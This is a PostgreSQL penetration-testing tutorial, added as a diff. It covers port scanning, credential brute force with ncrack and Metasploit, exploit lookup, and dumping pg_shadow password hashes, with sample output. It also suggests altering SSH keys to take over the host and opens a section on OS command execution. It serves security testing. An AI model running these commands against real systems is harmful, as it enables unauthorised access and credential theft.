@@ -1,0 +1,1240 @@
+*** PostgreSQL DATABASE PENETRATION TESTING (HOW TO) ***
+
+==============================================================================================================
+INDEX
+==============================================================================================================
+01. Reminder (definitions)
+02. PostgreSQL Database Penetration Testing - List of attacks
+03. How to perform a network TCP ports scan to locate an PostgreSQL Database
+04. How to perform a brute-force attack to identify valid database credentials (logins & passwords)
+05. How to identify PostgreSQL database vulnerabilities due to missing security patches
+06. How to log into a PostgreSQL database using valid credentials
+07. How to identify and exploit database and OS privilege escalation vulnerabilities
+08. How to dump and crack PostgreSQL password hashes
+
+
+==============================================================================================================
+01. Reminder - definitions
+==============================================================================================================
+
+• SCHEMA
+In PostgreSQL, a schema holds all objects, except for roles and tablespaces. Schemas effectively act like namespaces, allowing objects of the same name to co-exist in the same database. By default, newly created databases have a schema called public, but any further schemas can be added, and the public schema isn't mandatory.
+
+• TABLES
+Tables are the basic unit of data storage in a database. Data is stored in rows and columns. 
+
+• VIEWS
+Views are virtual tables formed by a query. A view is a dictionary object that you can use until you drop it. Views are not updatable.
+
+• 'postgres' user
+The postgresSQL database's default superuser.
+  
+• DEFAULT ROLES 
+PostgreSQL provides a set of default roles which provide access to certain, commonly needed, privileged capabilities and information. Administrators can GRANT these roles to users and/or other roles in their environment, providing those users with access to the specified capabilities and information.
+
+Role				Allowed Access
+----------------------------------------------------------------------------------------------------------
+pg_read_all_settings		Read all configuration variables, even those normally visible only to superusers.
+pg_read_all_stats		Read all pg_stat_* views and use various statistics related extensions, even those normally visible only to superusers.
+pg_stat_scan_tables		Execute monitoring functions that may take ACCESS SHARE locks on tables, potentially for a long time.
+pg_monitor			Read/execute various monitoring views and functions. This role is a member of pg_read_all_settings, pg_read_all_stats and pg_stat_scan_tables.
+pg_signal_backend		Signal another backend to cancel a query or terminate its session.
+pg_read_server_files		Allow reading files from any location the database can access on the server with COPY and other file-access functions.
+pg_write_server_files		Allow writing to files in any location the database can access on the server with COPY and other file-access functions.
+pg_execute_server_program	Allow executing programs on the database server as the user the database runs as with COPY and other functions which allow executing a server-side program.
+
+
+• PROCEDURAL LANGUAGES 
+- Procedural languages allow developers to extend the database with custom subroutines (functions), often called stored procedures. 
+- Languages are divided into two groups: Procedures written in safe languages are sandboxed and can be safely created and used by any user. Procedures written in unsafe languages can only be created by superusers, because they allow bypassing a database's security restrictions, but can also access sources external to the database. Some languages like Perl provide both safe and unsafe versions.
+- PostgreSQL has built-in support for three procedural languages: Plain SQL (safe), Procedural Language/PostgreSQL (PL/pgSQL) (safe) and C (unsafe).
+- PostgreSQL allows procedural languages to be loaded into the database through extensions. Three language extensions are included with PostgreSQL to support Perl, Python and Tcl.
+
+• AUTHENTICATION MECHANISMS
+PostgreSQL natively supports a broad number of external authentication mechanisms, including:
+- Password: either SCRAM-SHA-256 (since PostgreSQL 10), MD5 or plain-text
+- Generic Security Services Application Program Interface (GSSAPI)
+- Security Support Provider Interface (SSPI)
+- Kerberos
+- ident (maps O/S user-name as provided by an ident server to database user-name)
+- Peer (maps local user name to database user name)
+- Lightweight Directory Access Protocol (LDAP)
+- Active Directory (AD)
+- RADIUS
+- Certificate
+- Pluggable authentication module (PAM)
+
+These methods are specified in the cluster's host-based authentication configuration file (pg_hba.conf), which determines what connections are allowed. This allows control over which user can connect to which database, where they can connect from (IP address, IP address range, domain socket), which authentication system will be enforced, and whether the connection must use Transport Layer Security (TLS). (https://www.postgresql.org/docs/9.4/auth-pg-hba-conf.html)
+
+• VERSIONS 
+- https://www.postgresql.org/support/versioning/
+
+Version	Current minor	Supported	First Release		Final Release
+---------------------------------------------------------------------------------
+12	12.2		Yes		October 3, 2019		November 14, 2024
+11	11.7		Yes		October 18, 2018	November 9, 2023
+10	10.12		Yes		October 5, 2017		November 10, 2022
+9.6	9.6.17		Yes		September 29, 2016	November 11, 2021
+9.5	9.5.21		Yes		January 7, 2016		February 11, 2021
+9.4	9.4.26		No		December 18, 2014	February 13, 2020
+9.3	9.3.25		No		September 9, 2013	November 8, 2018
+9.2	9.2.24		No		September 10, 2012	November 9, 2017
+9.1	9.1.24		No		September 12, 2011	October 27, 2016
+9.0	9.0.23		No		September 20, 2010	October 8, 2015
+8.4	8.4.22		No		July 1, 2009		July 24, 2014
+8.3	8.3.23		No		February 4, 2008	February 7, 2013
+
+
+==============================================================================================================
+02. PostgreSQL Database Penetration Testing - List of attacks
+==============================================================================================================
+
+Black-box penetration test (FROM unauthenticated attacker TO authenticated database user)
+------------------------------------------------------------------------------------------
+• Brute-force attack to identify default or trivial database credentials
+• SQL injection in a Web application that allows to run unauthorized SQL queries to a PostgreSQL database
+• You have compromised a server and you found clear-text PostgreSQL database credentials hardcoded in scripts, configuration files, .bash_history files or application source code. 
+• Run an PostgreSQL database remote exploit (0 day or missing patches)
+• Man-In-The-Middle attack to eavesdropped clear-text or hashed credentials (e.g. ARP cache poisoning)
+• …
+
+
+Grey-box penetration test (Privilege escalation to become either database administrator or execute arbitrary OS command on the OS server supporting the PostgreSQL database)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+* Exploit unpatched vulnerabilities
+------------------------------------
+• CVE-2017-14798: A race condition in the postgresql init script (postgres version =< 9.4) could be used by attackers able to access the postgresql account to escalate their privileges to root.
+=> https://www.cvedetails.com/cve/CVE-2017-14798/
+=> https://www.exploit-db.com/exploits/45184
+
+• CVE-2013-1899: PostgreSQL Database Name Command Line Flag Injection. 
+This module can identify PostgreSQL 9.0, 9.1, and 9.2 servers that are vulnerable to command-line flag injection through CVE-2013-1899. This can lead to denial of service, privilege escalation, or even arbitrary code execution.
+=> https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_dbname_flag_injection
+
+• CVE-2007-6600: Postgres Privilege Escalation for version 8.2 before 8.2.6, 8.1 before 8.1.11, 8.0 before 8.0.15.
+=> https://github.com/nibin/retuts/wiki/Privilege-Escalation-in-PostgreSQL
+
+• CVE-2007-3280: PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution
+On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries from there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared object's constructor, it does not need to conform to specific Postgres API versions.
+=> http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt
+=> https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload
+=> https://www.rapid7.com/db/modules/exploit/windows/postgres/postgres_payload
+
+
+* Exploit misconfiguration issues or superuser privilege
+---------------------------------------------------------
+
+• Execute OS command with 'COPY FROM PROGRAM'
+In PostgreSQL 9.3 through 11.2, the "COPY TO/FROM PROGRAM" function allows superusers and users in the 'pg_execute_server_program' group to execute arbitrary code in the context of the database's operating system user. This functionality is enabled by default and can be abused to run arbitrary operating system commands on Windows, Linux, and macOS. 
+NOTE (CVE-2019-9193): Third parties claim/state this is not an issue because PostgreSQL functionality for 'COPY TO/FROM PROGRAM' is acting as intended. References state that in PostgreSQL, a superuser can execute commands as the server user without using the 'COPY FROM PROGRAM'.
+=> https://www.cvedetails.com/cve/CVE-2019-9193/
+=> https://www.rapid7.com/db/modules/exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+=> https://github.com/attackercan/psql-mass-rce
+
+• Read and Write OS files using 'pg_read_server_files' and 'pg_write_server_files' or 'superuser' privileges
+Try to read and write/modify interesting files such as configuration files, scripts, logs (e.g. '/home/<user>/.bash_history'), SSH keys (e.g. '/home/<user>/.ssh/authorized_keys') that will allow you to take over the Linux or Windows server hosting the PostgreSQL database. 
+
+• Execute OS command with a 'malicious' extension
+If you have superuser privileges on the PostgreSQL databases, you can run OS commands by creating a 'malicious' extension.
+=> https://github.com/cybertec-postgresql/pg_remote_exec  ('pg_remote_exec' is a PostgreSQL extension for "ssh-over-postgres")
+=> https://github.com/Dionach/pgexec
+
+• PostgreSQL CREATE LANGUAGE Execution (if loading external scripting languages is enabled)
+Some installations of Postgres 8 and 9 are configured to allow loading external scripting languages. Most commonly this is Perl and Python. When enabled, command execution is possible on the host.
+To execute system commands, loading the "untrusted" version of the language is necessary. This requires a superuser. This is usually postgres. 
+=> https://www.rapid7.com/db/modules/exploit/multi/postgres/postgres_createlang
+
+• Brute-force attack (default or easy guessable credentials).
+
+• Post-exploitation - Exploit DBlinks and postgres_fdw modules
+
+• Capture postgresql authentication credentials.
+=> https://www.rapid7.com/db/modules/auxiliary/server/capture/postgresql
+
+
+==============================================================================================================
+03. How to perform a network TCP ports scan to locate a PostgreSQL database
+==============================================================================================================
+
+pentester@KaliLinux> nmap -Pn -sS -sV -vv -p 5432 IP-address
+pentester@KaliLinux> nmap -v -Pn -sS -sV -p- 192.168.75.149 
+
+Examples:
+
+	Nmap scan report for 192.168.1.104
+	Host is up (0.00044s latency).
+
+	PORT      STATE SERVICE     VERSION
+	5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5
+	|_ssl-date: TLS randomness does not represent time
+
+
+==============================================================================================================
+04. How to perform a brute-force attack to identify valid PostgreSQL database credentials (logins & passwords)
+==============================================================================================================
+
+• Default database administrator credentials: postgres:postgres
+• Other common credentials: admin:admin, admin:postgres, admin:password
+
+
+* NMAP - 'pgsql-brute' module (https://nmap.org)
+------------------------------------------------------------------------
+
+pentester@KaliLinux> nmap -p 5432 --script pgsql-brute <host>
+Script Output
+5432/tcp open  pgsql
+| pgsql-brute:
+|   postgres:postgres => Valid credentials
+|_  test:test => Valid credentials
+
+
+* NCRACK tool (https://nmap.org/ncrack/)
+------------------------------------------------------------------------
+
+ncrack psql://sqlserver -u postgres -P /usr/share/wordlists/rockyou.txt
+
+//warning: rockyou.txt does not contain by default 'postgres'
+
+root@Security-Audit-01:/home/pentester# ncrack psql://192.168.1.26 -u postgres -P /usr/share/wordlists/rockyou2.txt
+Starting Ncrack 0.7 ( http://ncrack.org ) at 2020-03-20 02:22 CET
+Stats: 0:00:06 elapsed; 0 services completed (1 total)
+Rate: 1040.39; Found: 1; About 0.03% done
+(press 'p' to list discovered credentials)
+
+Discovered credentials for psql on 192.168.1.26 5432/tcp:
+192.168.1.26 5432/tcp psql: 'postgres' 'postgres'
+
+caught SIGINT signal, cleaning up
+
+
+* Metasploit - 'postgres_login' module (https://www.metasploit.com)
+------------------------------------------------------------------------
+
+pentester@KaliLinux> msfconsole
+	> auxiliary/scanner/postgres/postgres_login
+	> show options
+	> set RHOSTS <Target IP>
+	> set USERPASS_FILE /root/<your_username_file>
+	> set PASS_FILE /root/<your_password_file>
+	> exploit
+
+Example:
+-------
+msf5 > use auxiliary/scanner/postgres/postgres_login
+msf5 auxiliary(scanner/postgres/postgres_login) > options
+Module options (auxiliary/scanner/postgres/postgres_login):
+
+   Name              Current Setting                                                               Required  Description
+   ----              ---------------                                                               --------  -----------
+   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
+   DATABASE          template1                                                                     yes       The database to authenticate against
+   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
+   PASSWORD                                                                                        no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
+   RHOSTS                                                                                          yes       The target address range or CIDR identifier
+   RPORT             5432                                                                          yes       The target port
+   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                             yes       The number of concurrent threads
+   USERNAME                                                                                        no        A specific username to authenticate as
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
+   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
+   VERBOSE           true                                                                          yes       Whether to print output for all attempts
+
+msf5 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 auxiliary(scanner/postgres/postgres_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.1.104:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+
+[+] 192.168.1.104:5432 - Login Successful: postgres:postgres@template1
+
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf5 auxiliary(scanner/postgres/postgres_login) > 
+
+
+==========================================================================================================
+05. How to identify PostgreSQL database vulnerabilities due to missing security patches
+==========================================================================================================
+
+In addition to login manually with PGSQL or using NMAP, there is the 'PostgreSQL Version Probe' module of Metasploit that can enumerate the version of PostgreSQL servers.
+
+> auxiliary/scanner/postgres/postgres_version
+> https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_version
+
+
+msf5 > use auxiliary/scanner/postgres/postgres_version
+msf5 auxiliary(scanner/postgres/postgres_version) > options
+
+Module options (auxiliary/scanner/postgres/postgres_version):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     5432             yes       The target port
+   THREADS   1                yes       The number of concurrent threads
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+msf5 auxiliary(scanner/postgres/postgres_version) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 auxiliary(scanner/postgres/postgres_version) > run
+
+[*] 192.168.1.104:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+> Then we can use the tool searchsploit to identify PostgreSQL exploits:
+ 
+pentester@Security-Audit-01:~$ searchsploit postgresql
+----------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                                                                   |  Path
+                                                                                                                                                                 | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+PostgreSQL - 'bitsubstr' Buffer Overflow                                                                                                                         | exploits/linux/dos/33571.txt
+PostgreSQL 6.3.2/6.5.3 - Cleartext Passwords                                                                                                                     | exploits/immunix/local/19875.txt
+PostgreSQL 7.x - Multiple Vulnerabilities                                                                                                                        | exploits/linux/dos/25076.c
+PostgreSQL 8.01 - Remote Reboot (Denial of Service)                                                                                                              | exploits/multiple/dos/946.c
+PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                                                                                               | exploits/linux/local/7855.txt
+PostgreSQL 8.3.6 - Conversion Encoding Remote Denial of Service                                                                                                  | exploits/linux/dos/32849.txt
+PostgreSQL 8.3.6 - Low Cost Function Information Disclosure                                                                                                      | exploits/multiple/local/32847.txt
+PostgreSQL 8.4.1 - JOIN Hashtable Size Integer Overflow Denial of Service                                                                                        | exploits/multiple/dos/33729.txt
+PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)                                                                                                | exploits/multiple/remote/46813.rb
+PostgreSQL 9.4-0.5.3 - Privilege Escalation                                                                                                                      | exploits/linux/local/45184.sh
+----------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+
+> we can also check the modules/exploits available in Metasploit for PostgreSQL:
+
+msf5 > search postgres
+
+Matching Modules
+================
+
+   Name                                                       Disclosure Date  Rank       Check  Description
+   ----                                                       ---------------  ----       -----  -----------
+   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
+   auxiliary/admin/postgres/postgres_readfile                                  normal     No     PostgreSQL Server Generic Query
+   auxiliary/admin/postgres/postgres_sql                                       normal     No     PostgreSQL Server Generic Query
+   auxiliary/analyze/jtr_postgres_fast                                         normal     No     John the Ripper Postgres SQL Password Cracker
+   auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal     Yes    PostgreSQL Database Name Command Line Flag Injection
+   auxiliary/scanner/postgres/postgres_hashdump                                normal     Yes    Postgres Password Hashdump
+   auxiliary/scanner/postgres/postgres_login                                   normal     Yes    PostgreSQL Login Utility
+   auxiliary/scanner/postgres/postgres_schemadump                              normal     Yes    Postgres Schema Dump
+   auxiliary/scanner/postgres/postgres_version                                 normal     Yes    PostgreSQL Version Probe
+   auxiliary/server/capture/postgresql                                         normal     No     Authentication Capture: PostgreSQL
+   exploit/linux/postgres/postgres_payload                    2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
+   exploit/multi/http/manage_engine_dc_pmp_sqli               2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   exploit/multi/postgres/postgres_createlang                 2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
+   exploit/windows/misc/manageengine_eventlog_analyzer_rce    2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
+   exploit/windows/postgres/postgres_payload                  2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
+   post/linux/gather/enum_users_history                                        normal     No     Linux Gather User History
+
+
+==========================================================================================================
+06. How to log into a PostgreSQL Database using valid credentials
+==========================================================================================================
+
+* PostgreSQL client
+--------------------------------------------------
+
+LINUX
+
+> Remote login
+
+   • pentester@KaliLinux> psql -h 192.168.1.26 -U postgres -W
+       
+     Password for user postgres: <enter password>
+     pgsql> 
+     pgsql> SELECT VERSION();
+                                            version                                            
+	    -----------------------------------------------------------------------------------------------
+	    PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 	4.2.3-2ubuntu4)
+	    (1 row)
+     pgsql> 
+     pgsql> \l 
+			                    List of databases
+	   Name    |  Owner   | Encoding |   Access privileges   
+	-----------+----------+----------+-----------------------
+	 postgres  | postgres | UTF8     | 
+	 template0 | postgres | UTF8     | =c/postgres          +
+	           |          |          | postgres=CTc/postgres
+	 template1 | postgres | UTF8     | =c/postgres          +
+ 	          |          |          | postgres=CTc/postgres
+	(3 rows)
+  
+     pgsql> 
+     pgsql> \du
+                       List of roles
+	 Role name |            Attributes             | Member of 
+	-----------+-----------------------------------+-----------
+	 postgres  | Superuser, Create role, Create DB | {}
+
+
+   In case you want to use SSL mode for the connection, just specify it as shown in the following command:
+   • pentester@KaliLinux> psql -U user -h host "dbname=db sslmode=require"
+
+
+> Local login
+
+   • pentester@KaliLinux> psql -U postgres
+
+
+WINDOWS
+
+   • To add
+
+
+* DbVisualizer (GUI multi-database client; https://dbvis.com)
+--------------------------------------------------------------
+
+pentester@LinuxVM > sudo find / -name dbvis
+		/root/DbVisualizer/wrapper/classes/com/onseven/dbvis
+		/root/DbVisualizer/dbvis
+		/usr/local/bin/dbvis
+
+pentester@LinuxVM > sudo su
+root@LinuxVM > cd /root/DbVisualizer/
+root@LinuxVM > ./dbvis
+
+On the GUI
+> Go to "TOOLS"
+> Go to "New Connection Wizard"
+> Enter "PostgreSQL pentest training"
+> Select Database Connector for PostgreSQL
+> Enter all the right info
+> "Ping Server"
+> "Connect"
+
+
+* Metasploit - 'PostgreSQL Server Generic Query' module
+--------------------------------------------------------
+This module allows for simple SQL statements to be executed against a PostgreSQL instance given the appropriate credentials.
+
+> auxiliary/admin/postgres/postgres_sql
+> https://www.rapid7.com/db/modules/auxiliary/admin/postgres/postgres_sql
+
+
+Examples:
+
+msf5 auxiliary(admin/postgres/postgres_sql) > options
+Module options (auxiliary/admin/postgres/postgres_sql):
+
+   Name           Current Setting   Required  Description
+   ----           ---------------   --------  -----------
+   DATABASE       template1         yes       The database to authenticate against
+   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.
+   RETURN_ROWSET  true              no        Set to true to see query result sets
+   RHOSTS         192.168.1.26      yes       The target address range or CIDR identifier
+   RPORT          5432              yes       The target port
+   SQL            select version()  no        The SQL query to execute
+   USERNAME       postgres          yes       The username to authenticate as
+   VERBOSE        false             no        Enable verbose output
+
+msf5 auxiliary(admin/postgres/postgres_sql) > run
+
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+
+[*] Auxiliary module execution completed
+
+
+msf5 auxiliary(admin/postgres/postgres_sql) > options
+Module options (auxiliary/admin/postgres/postgres_sql):
+
+   Name           Current Setting                                             Required  Description
+   ----           ---------------                                             --------  -----------
+   DATABASE       template1                                                   yes       The database to authenticate against
+   PASSWORD       postgres                                                    no        The password for the specified username. Leave blank for a random password.
+   RETURN_ROWSET  true                                                        no        Set to true to see query result sets
+   RHOSTS         192.168.1.26                                                yes       The target address range or CIDR identifier
+   RPORT          5432                                                        yes       The target port
+   SQL            SELECT usename, usesysid, usesuper, passwd FROM pg_shadow;  no        The SQL query to execute
+   USERNAME       postgres                                                    yes       The username to authenticate as
+   VERBOSE        false                                                       no        Enable verbose output
+
+msf5 auxiliary(admin/postgres/postgres_sql) > run
+
+Query Text: 'SELECT usename, usesysid, usesuper, passwd FROM pg_shadow;'
+========================================================================
+
+    usename   usesysid  usesuper  passwd
+    -------   --------  --------  ------
+    postgres  10        t         md53175bce1d3201d16594cebf9d7eb3f9d
+
+[*] Auxiliary module execution completed
+
+
+
+==========================================================================================================
+07. How to identify and exploit database and OS privileges escalation vulnerabilities
+==========================================================================================================
+
+07.1. Check for various useful information (i.e. list of users, DB password policy, who is DBA...) 
+==========================================================================================================
+
+
+Some interesting flags (to see all, use -h or --help depending on your psql version)
+------------------------------------------------------------------------------------
+   • -E: will describe the underlaying queries of the \ commands (cool for learning!)
+   • -l: psql will list all databases and then exit (useful if the user you connect with doesn't has a default database, like at AWS RDS)
+
+Most \d commands support additional param of __schema__.name__ and accept wildcards like *.*
+   • \q: Quit/Exit
+   • \c __database__		Connect to a database
+   • \d __table__		Show table definition including triggers
+   • \d+ __table__		More detailed table definition including description and physical disk size
+   • \l				List databases
+   • \dy			List events
+   • \df 			List functions
+   • \di 			List indexes
+   • \dn 			List schemas
+   • \dt *.* 			List tables from all schemas (if *.* is omitted will only show SEARCH_PATH ones)
+   • \dT+ 			List all data types
+   • \dv			List views
+   • \du			List of users and roles
+   • \df+ __function__  	Show function SQL code.
+   • \x 			Pretty-format query results instead of the not-so-useful ASCII tables
+
+   • \copy (SELECT * FROM __table_name__) TO 'file_path_and_name.csv' WITH CSV: Export a table as CSV
+
+   • \i filename		Execute psql commands from a file
+   • \q				Quit psql
+
+
+User Related
+-------------
+   • \du 								List users and roles
+   • \du username 							List a username if present.
+   • create role __test1__ 						Create a role with an existing username.
+   • create role __test2__ noinherit login password __passsword__; 	Create a role with username and password.
+   • set role __test__; 						Change role for current session to __test__.
+   • grant __test2__ to __test1__; 					Allow __test1__ to set its role as __test2__.
+
+
+To display the privileges of a specific suer
+----------------------------------------------
+   • SELECT table_catalog, table_schema, table_name, privilege_type FROM information_schema.table_privileges WHERE grantee = 'example_user';
+
+
+Useful SQL queries
+-------------------
+   • SELECT VERSION();							Display the database version
+   • \connect db_name							Change current database
+   • SELECT * FROM pg_shadow;						Extract the password hashes
+   • pg_dump -Fc dbname > filename					Back up a database (database backups are compressed by default)
+   • pg_restore -d dbname filename					Restore from backup
+   • GRANT pg_read_server_files TO test_user;				Grant privileges to a user
+
+
+Default Roles
+-------------
+
+Role				Allowed Access
+----------------------------------------------------------------------------------------------------------
+pg_read_all_settings		Read all configuration variables, even those normally visible only to superusers.
+pg_read_all_stats		Read all pg_stat_* views and use various statistics related extensions, even those normally visible only to superusers.
+pg_stat_scan_tables		Execute monitoring functions that may take ACCESS SHARE locks on tables, potentially for a long time.
+pg_monitor			Read/execute various monitoring views and functions. This role is a member of pg_read_all_settings, pg_read_all_stats and pg_stat_scan_tables.
+pg_signal_backend		Signal another backend to cancel a query or terminate its session.
+pg_read_server_files		Allow reading files from any location the database can access on the server with COPY and other file-access functions.
+pg_write_server_files		Allow writing to files in any location the database can access on the server with COPY and other file-access functions.
+pg_execute_server_program	Allow executing programs on the database server as the user the database runs as with COPY and other functions which allow executing a server-side program.
+
+
+
+Role Attributes
+---------------
+A database role can have a number of attributes that define its privileges and interact with the client authentication system.
+
+ • login privilege
+Only roles that have the LOGIN attribute can be used as the initial role name for a database connection. A role with the LOGIN attribute can be considered the same as a “database user”. To create a role with login privilege, use either: 'CREATE ROLE name LOGIN;' or 'CREATE USER name;'
+
+• 'superuser' status: 
+A database 'superuser' bypasses all permission checks, except the right to log in. This is a dangerous privilege and should not be used carelessly; it is best to do most of your work as a role that is not a superuser. To create a new database superuser, use 'CREATE ROLE name SUPERUSER'. You must do this as a role that is already a superuser.
+
+
+List of roles/users
+-------------------
+postgres=# \du
+		List of roles
+Role name     |                         Attributes                         | Member of
+---------------+------------------------------------------------------------+-----------
+auditor       | Superuser, Replication                                     | {}
+doadmin       | Create role, Create DB, Replication, Bypass RLS            | {}
+postgres      | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
+user	      | 					                   | {}
+
+Note:
+create role pentester nosuperuser login nocreatedb nocreaterole Password 'Password1';
+create role auditor nosuperuser login nocreatedb nocreaterole Password 'Password1';
+
+
+
+*  Metasploit - 'Postgres Schema Dump' module
+--------------------------------------------------
+This module extracts the schema information from a PostgreSQL DB server.
+
+> auxiliary/scanner/postgres/postgres_schemadump
+> https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_schemadump
+
+msf5 auxiliary(scanner/postgres/postgres_schemadump) > options
+Module options (auxiliary/scanner/postgres/postgres_schemadump):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   DATABASE         postgres         yes       The database to authenticate against
+   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
+   PASSWORD         postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS                            yes       The target address range or CIDR identifier
+   RPORT            5432             yes       The target port
+   THREADS          1                yes       The number of concurrent threads
+   USERNAME         postgres         yes       The username to authenticate as
+
+msf5 auxiliary(scanner/postgres/postgres_schemadump) > set RHOSTS 192.168.1.26
+RHOSTS => 192.168.1.26
+msf5 auxiliary(scanner/postgres/postgres_schemadump) > run
+
+[+] Postgres SQL Server Schema 
+ Host: 192.168.1.26 
+ Port: 5432 
+ ====================
+
+--- []
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+
+*  Audit Tool - PostgreSQL STIG Compliance Validator (pgStigCheck) 
+--------------------------------------------------------------------
+=> PostgreSQL STIG Compliance Validator (pgStigCheck) for InSpec is an open source compliance testing solution for PostgreSQL.
+=> The PostgreSQL Security Technical Implementation Guide (STIG) by the United States Defense Information Systems Agency (DISA) offers security-conscious enterprises a comprehensive guide for the configuration and operation of open source PostgreSQL.
+=> https://github.com/CrunchyData/pgstigcheck-inspec
+
+
+
+07.2. DB/OS Privesc - Execute OS command with 'COPY FROM PROGRAM'
+==========================================================================================================
+The COPY .. PROGRAM feature explicitly states that it can only be executed by database users that have been granted 'superuser' privileges or the default role 'pg_execute_server_program'. 
+By design, this feature allows one who is granted superuser or pg_execute_server_program to perform actions as the operating system user the PostgreSQL server runs under (normally "postgres"). 
